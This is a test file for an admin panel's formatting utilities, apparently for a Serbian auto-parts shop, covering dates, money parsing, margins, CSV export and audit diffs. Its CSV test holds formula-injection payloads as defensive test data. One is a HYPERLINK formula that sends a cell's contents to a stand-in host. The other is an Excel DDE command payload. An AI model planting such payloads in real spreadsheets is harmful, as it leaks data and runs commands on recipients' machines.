import { describe, expect, test } from "vitest";

import {
  compactDate,
  compactDateTime,
  engineLabel,
  formatAgo,
  formatBp,
  formatElapsed,
  marginBp,
  moneyInputValue,
  parseMoneyInput,
  parsePercent,
  splitDocNumber,
  neutralizeCsvFormula,
  toCsv,
} from "@/lib/admin/format";
import { belgradeLocalToUtc } from "@/lib/domain/time";
import { breadcrumbTrail } from "@/components/admin/shell/context";
import { diffFields } from "@/convex/lib/audit";

const now = belgradeLocalToUtc(2026, 9, 30, 12, 0);

describe("admin formatting", () => {
  test("compact dates drop the current year only", () => {
    expect(compactDateTime(belgradeLocalToUtc(2026, 9, 29, 11, 42), now)).toBe("29.09. 11:42");
    expect(compactDateTime(belgradeLocalToUtc(2025, 12, 31, 23, 5), now)).toBe("31.12.2025. 23:05");
    expect(compactDate(belgradeLocalToUtc(2026, 1, 2, 8), now)).toBe("02.01.");
  });

  test("document numbers split into prefix and sequence", () => {
    expect(splitDocNumber("SK-2026-000187")).toEqual({ prefix: "SK-2026-", seq: "000187" });
    expect(splitDocNumber("NEOBICNO")).toEqual({ prefix: "", seq: "NEOBICNO" });
  });

  test("elapsed and relative times", () => {
    expect(formatElapsed(45)).toBe("45 min");
    expect(formatElapsed(134)).toBe("2 h 14 min");
    expect(formatElapsed(120)).toBe("2 h");
    expect(formatElapsed(60 * 24 * 3 + 120)).toBe("3 d 2 h");
    expect(formatAgo(now - 30_000, now)).toBe("upravo");
    expect(formatAgo(now - 3 * 60_000, now)).toBe("pre 3 min");
    expect(formatAgo(now - 5 * 3_600_000, now)).toBe("pre 5 h");
    expect(formatAgo(now - 30 * 3_600_000, now)).toBe("juče");
  });

  test("percent and money inputs", () => {
    expect(parsePercent("12,5")).toBe(12.5);
    expect(parsePercent("−10 %")).toBe(-10);
    expect(parsePercent("")).toBeUndefined();
    expect(Number.isNaN(parsePercent("abc"))).toBe(true);
    expect(formatBp(1250)).toBe("12,5 %");
    expect(parseMoneyInput("12.990,50")).toBe(1_299_050);
    expect(parseMoneyInput("")).toBeUndefined();
    expect(Number.isNaN(parseMoneyInput("dvanaest"))).toBe(true);
    expect(moneyInputValue(1_299_050)).toBe("12990,50");
    expect(moneyInputValue(1_000_000)).toBe("10000");
    expect(moneyInputValue(null)).toBe("");
  });

  test("margin over a VAT-inclusive price", () => {
    // 12.000 RSD incl. 20 % VAT = 10.000 net; cost 8.000 → 20 %.
    expect(marginBp(1_200_000, 800_000, 2_000)).toBe(2_000);
    expect(marginBp(1_200_000, null, 2_000)).toBeNull();
  });

  test("CSV for Excel: BOM, semicolons, quoting", () => {
    const csv = toCsv([
      ["Broj", "Kupac"],
      ["SK-1", 'Firma "Jović"; Niš'],
    ]);
    expect(csv.startsWith("﻿")).toBe(true);
    expect(csv).toContain('SK-1;"Firma ""Jović""; Niš"');
  });

  test("CSV cells that Excel would run as formulas are neutralised", () => {
    expect(neutralizeCsvFormula('=HYPERLINK("https://x.test/?"&A1,"klik")')).toBe(
      `'=HYPERLINK("https://x.test/?"&A1,"klik")`,
    );
    expect(neutralizeCsvFormula("+381 cmd")).toBe("'+381 cmd");
    expect(neutralizeCsvFormula("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(neutralizeCsvFormula("\t=1+1")).toBe("'\t=1+1");
    // Plain numbers and ordinary text stay as they are.
    expect(neutralizeCsvFormula("-1.250,00")).toBe("-1.250,00");
    expect(neutralizeCsvFormula("+381641234567")).toBe("+381641234567");
    expect(neutralizeCsvFormula("Petar Petrović")).toBe("Petar Petrović");
    const csv = toCsv([["Kupac", "Iznos"], ["=cmd|' /C calc'!A0", -500]]);
    expect(csv).toContain("'=cmd|' /C calc'!A0;-500");
  });

  test("engine label never repeats the power", () => {
    expect(engineLabel("1.9 TDI 77 kW", 77)).toBe("1.9 TDI 77 kW");
    expect(engineLabel("2.0 TDI", 110)).toBe("2.0 TDI · 110 kW");
  });

  test("breadcrumbs name sections and use the page label for ids", () => {
    expect(breadcrumbTrail("/admin/porudzbine/SK-2026-000001", null).map((t) => t.label)).toEqual([
      "Pregled",
      "Porudžbine",
      "SK-2026-000001",
    ]);
    expect(breadcrumbTrail("/admin/proizvodi/abc123", "Turbina").map((t) => t.label)).toEqual([
      "Pregled",
      "Proizvodi",
      "Turbina",
    ]);
  });
});

describe("audit diff", () => {
  test("a change after the first 500 characters is still a change (stored value is capped)", () => {
    const long = "a".repeat(800);
    const diff = diffFields({ body: long }, { body: `${long}b` });
    expect(diff).toHaveLength(1);
    expect(diff[0]!.after!.length).toBe(500);
    expect(diffFields({ body: long }, { body: long })).toHaveLength(0);
  });
});
